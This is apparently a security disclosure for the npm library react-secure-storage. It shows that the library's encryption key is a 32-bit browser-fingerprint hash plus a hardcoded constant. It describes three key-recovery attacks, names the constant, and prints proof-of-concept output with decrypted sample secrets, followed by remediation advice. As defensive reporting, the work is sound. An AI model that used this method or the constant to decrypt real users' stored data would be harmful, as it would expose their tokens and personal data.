# FingerDust — `react-secure-storage` encrypts with a 32-bit, non-secret key

*Low-entropy / weak-crypto wildcard finding. A library marketed to "securely
store data in local storage" derives its AES passphrase from a **32-bit
non-cryptographic hash (murmurhash3) of public browser attributes**, glued to a
**hardcoded constant** baked into every copy on npm. The "secret" is neither
secret nor high-entropy: an attacker who obtains the stored blob recovers all
plaintext from public request metadata, by blind ≤2³² brute force, or — on any
server render — with a single published constant.*

| Field | Value |
| --- | --- |
| Target | **`react-secure-storage`** (npm) — "securely store data in local storage" |
| Prominence | **~35,600 downloads/week** (npm `last-week`, 2026-10-23→29) · **146★ / 14 forks** on GitHub |
| Repo / license | https://github.com/sushinpv/react-secure-storage · MIT · latest `1.3.2` |
| Crypto | `CryptoJS.AES.encrypt(value, secureKey)` (AES-256-CBC, OpenSSL MD5-KDF, random salt) |
| Key derivation | `secureKey = String( murmurhash3_32( publicBrowserAttrs, 256 ) ) + "E86E2612010258B35137"` |
| Type | **CWE-330/331** insufficient entropy · **CWE-338** non-crypto PRNG/hash for a key · **CWE-328** reversible/weak hash · **CWE-798** hardcoded key |
| Impact | Full recovery of every "secure" value (auth/session tokens, PII, account data) from a leaked localStorage blob — no secret required |

## The bug

`EncryptionService` encrypts every value with a passphrase it calls `secureKey`:

```ts
// src/lib/encryption.ts
this.secureKey = getFingerprint();
...
encrypt(value: string) { return AES.encrypt(value, this.secureKey).toString(); }
```
Permalink: https://github.com/sushinpv/react-secure-storage/blob/1ccd8897863762f5f7b4c4f93a323a0321b13684/src/lib/encryption.ts#L11-L22

`getFingerprint()` is that passphrase. It is a **browser fingerprint plus a
hardcoded constant**:

```ts
// src/lib/fingerprint.ts
const HASH_KEY = "E86E2612010258B35137";
const getFingerprint = () => {
  let HASH_KEY_CUSTOM = envHelper.getHashKey() || HASH_KEY;
  if (typeof window === "undefined") return HASH_KEY_CUSTOM;          // (!) SSR → just the constant
  return clientJS.getFingerprint() + HASH_KEY_CUSTOM;                 // (!) 32-bit int + constant
};
```
Permalink: https://github.com/sushinpv/react-secure-storage/blob/1ccd8897863762f5f7b4c4f93a323a0321b13684/src/lib/fingerprint.ts#L5-L16

And `clientJS.getFingerprint()` concatenates **public, mostly-constant browser
attributes** and crushes them to a **32-bit `murmurhash3`** — a *non-cryptographic*
hash — as the only entropy source for the key:

```ts
// src/lib/fingerprint.lib.ts  (getFingerprint)
key += navigator.userAgent + bar;      // public: in every HTTP request / access log
key += window.location.hostname + bar; // public: the app's own domain
key += this.getScreenPrint() + bar;    // "Color Depth: 24, Device XDPI: , Device YDPI: " (≈constant)
key += this.getPlugins() + bar;        // "" on modern browsers
key += this.getFonts() + bar;          // "" ALWAYS — font detection is commented out upstream
key += this.isLocalStorage() + bar;    // "true"
key += this.isSessionStorage() + bar;  // "true"
key += this.getTimeZone() + bar;       // ~27 values, usually inferable from IP
key += this.getLanguage() + bar;       // Accept-Language header (public)
key += this.getSystemLanguage() + bar; // same value again
key += this.isCookie() + bar;          // "true"
key += this.getCanvasPrint();          // per-OS/browser/GPU → identical across a user population
...
let seed = 256;
return murmurhash3_32_gc(key, seed);   // (!) output is a single 32-bit integer
```
Permalink (32-bit reduction): https://github.com/sushinpv/react-secure-storage/blob/1ccd8897863762f5f7b4c4f93a323a0321b13684/src/lib/fingerprint.lib.ts#L52-L55
·
`getFonts()` always returns `""`: https://github.com/sushinpv/react-secure-storage/blob/1ccd8897863762f5f7b4c4f93a323a0321b13684/src/lib/fingerprint.lib.ts#L352-L365

## Why this is "low entropy"

A real encryption key needs a high-entropy **secret**. This key has neither
property:

1. **Hard 32-bit ceiling.** `murmurhash3_32(..)` returns a 32-bit integer, so the
   whole passphrase is `String(N) + "E86E2612010258B35137"` for `N ∈ [0, 2³²)`.
   No matter how much goes into the hash, the key space is **≤ 2³² ≈ 4.29e9** —
   exhaustible in ~12 CPU-hours on one core (measured below), minutes on a
   workstation, seconds on a GPU. (A 128-bit AES key has 2⁹⁶× more.)
2. **The inputs aren't secret.** Every field above is public or near-constant:
   the User-Agent and hostname are in the app's own HTTP logs, language is in
   `Accept-Language`, screen/plugins/fonts/storage/cookie flags are fixed
   strings, timezone is ~27 values (often known from the client IP), and the
   canvas render is **identical for everyone on the same OS/browser/GPU**. To an
   attacker with ordinary request metadata the *residual* guessing space is only
   a few hundred combinations — Attack 1 below finds the key in **63 tries**.
3. **A hardcoded key for free.** `HASH_KEY = "E86E2612010258B35137"` ships in the
   tarball. In any `window`-less runtime (SSR / Next.js server components /
   React-Native-style / unit tests / server crypto helpers) the key is *exactly*
   that constant — one value that decrypts data from **every** install on earth.
4. **Non-crypto hash.** murmurhash3 is a fast hash table function, not a KDF; it
   provides no pre-image resistance and no key-stretching (CWE-328).

## Proof of concept

All offline. The "victim" runs the **real, unmodified `react-secure-storage@1.3.2`**
from `node_modules`; the attacker scripts never import it and are never given the
key, timezone, color depth, or canvas value.

```bash
cd poc/FingerDust
bash run.sh          # npm-installs the real package, then runs victim + 3 attacks + verify
```

Files:

- `browser_env.js` — faithful browser-global shim (navigator/window/document/
  localStorage) so the real library runs under Node. It does **not** weaken
  anything; `canvas.toDataURL()` returns a per-platform-constant string exactly
  as a real canvas does.
- `victim_store.js` — the real library encrypts 4 secrets into
  `leaked_localstorage.json`; writes `public_intel.json` (UA + hostname +
  Accept-Language, i.e. what the app already logs).
- `fp_recompute.js` — attacker-side port of the key derivation, using the **same**
  public `murmurhash-js` module the library uses (correctness is proven by the
  decryption succeeding).
- `attacker_env_recover.js` — **Attack 1**: reconstruct the key from public data.
- `ssr_universal_key.js` — **Attack 2**: the universal hardcoded-constant key.
- `entropy_bruteforce.js` — **Attack 3**: the 32-bit ceiling / blind brute force.
- `verify.js` — cross-checks Attack 1's secret-free output against the library's
  real key and plaintext.

### Output (verbatim, trimmed)

```
# VICTIM
[victim] stored 4 secrets with the REAL react-secure-storage
[victim] sample ciphertext (auth_token):
         U2FsdGVkX19KMgUP9/wKCU5kLpsm4s7L3q9WJrQIxsLIKVLUhEKy2DXnuqFC/NTQVOyffYAHkI3vQnZHmwjVmQ==

# ATTACK 1 — reconstruct key from PUBLIC data (UA + hostname + Accept-Language + canvas corpus)
[attack1] search space: 4 colorDepths x 27 timezones x 8 canvas renders = 864 candidates
[attack1] KEY RECOVERED after 63 candidates (no secret used)
[attack1] recovered fingerprint int: 169834592 (32-bit)
[attack1] recovered AES passphrase : 169834592E86E2612010258B35137
[attack1] decrypted secrets:
    @secure.s.auth_token       = EXAMPLE-not-a-real-key-session-7f3a9c21b4e8
    @secure.s.account_number   = GB29-NWBK-6016-1331-9268-19
    @secure.s.ssn              = SSN:078-05-1120
    @secure.s.balance          = 1375522.40

# VERIFY
[verify] attacker key == library's real key: true (169834592E86E2612010258B35137)
[verify] fields recovered by the attacker (no secret): 4/4

# ATTACK 2 — SSR path: key is the universal hardcoded constant
[attack2] typeof window = undefined (server-side render)
[attack2] library's secureKey here = "E86E2612010258B35137"
[attack2] RESULT: 3/3 fields recovered with zero knowledge

# ATTACK 3 — the 32-bit ceiling
[attack3] native brute-force rate: ~100,000 keys/sec (1 core, pure CPU)
[attack3] full 2^32 keyspace: ~12 core-hours -> ~22 min on 32 cores (seconds on a GPU)
[attack3] mechanism proof (each 32-bit int -> exactly one testable key):
    int=169834592      -> "SSN:078-05-1120"   (recovers plaintext)
    int=169834591  -> null   (off-by-one fails)
    int=169834593  -> null   (off-by-one fails)
    int=123456789  -> null   (random fails)
[attack3] RESULT: the AES passphrase has <= 32 bits of entropy; exhaustive search is trivial
```

Attack 1 recovers the exact key the real library used and all four fields using
only data the app logs for free. `verify.js` independently confirms 4/4 and that
the attacker's key equals the library's. Attack 2 shows the server-side key is a
single shared constant. Attack 3 measures the brute-force cost and proves (with
positive + negative controls) that the whole passphrase is pinned by one 32-bit
integer.

## Threat model (honest)

- **Not** a remote 0-click. The attacker must obtain the encrypted blob. Realistic
  vectors for client-side storage: a browser-profile/`localStorage` **backup or
  cloud sync**, a **stolen/shared device**, a malicious **browser extension** or
  another bug that can only *read* storage (e.g. a limited XSS or a path that
  leaks `localStorage` but not live script execution), DOM/state snapshots in
  error-reporting tools, or shared-kiosk machines.
- The library's own pitch is that this storage is "secure" and the value is
  "encrypted" — users reasonably put tokens and PII in it. The finding is that
  the encryption provides **≈0 extra protection**: anyone holding the blob
  recovers the plaintext. Confidentiality reduces to "attacker doesn't have the
  blob," which plain `localStorage` already gives you.
- Attack 1 assumes the attacker knows the victim's platform/UA (true for the app
  operator and for anyone with request logs) and has a small corpus of
  per-platform canvas renders (harvestable, since canvas is identical across a
  platform). Attack 3 removes *all* such assumptions at the cost of a ≤2³² sweep.
  Attack 2 needs nothing but the published constant.

## Remediation

- **Don't derive an encryption key from a browser fingerprint.** It is public,
  low-entropy, and (via murmurhash) capped at 32 bits. There is no secret on the
  client to protect client-side storage — treat `localStorage` as readable by
  anyone who gets the data.
- If obfuscation-at-rest is still desired, require the developer to supply a real
  high-entropy secret (`SECURE_LOCAL_STORAGE_HASH_KEY`) and **stretch** it with a
  salted KDF (PBKDF2/scrypt/Argon2) to a full-width key; use an **AEAD**
  (AES-256-GCM / XChaCha20-Poly1305) with a random per-record nonce via
  `crypto.subtle` / `crypto.getRandomValues()`.
- Remove the `window`-undefined fallback to a hardcoded constant, and never ship
  a default key in the package.
- For genuinely sensitive tokens, keep them out of JS-readable storage entirely
  (HttpOnly, SameSite cookies).

## References

- npm: https://www.npmjs.com/package/react-secure-storage
- Key derivation (murmur → 32-bit): https://github.com/sushinpv/react-secure-storage/blob/1ccd8897863762f5f7b4c4f93a323a0321b13684/src/lib/fingerprint.lib.ts#L52-L55
- Hardcoded constant + SSR fallback: https://github.com/sushinpv/react-secure-storage/blob/1ccd8897863762f5f7b4c4f93a323a0321b13684/src/lib/fingerprint.ts#L5-L16
- Encryption with the fingerprint as passphrase: https://github.com/sushinpv/react-secure-storage/blob/1ccd8897863762f5f7b4c4f93a323a0321b13684/src/lib/encryption.ts#L11-L22
- CWE-330 https://cwe.mitre.org/data/definitions/330.html · CWE-338 https://cwe.mitre.org/data/definitions/338.html · CWE-328 https://cwe.mitre.org/data/definitions/328.html · CWE-798 https://cwe.mitre.org/data/definitions/798.html
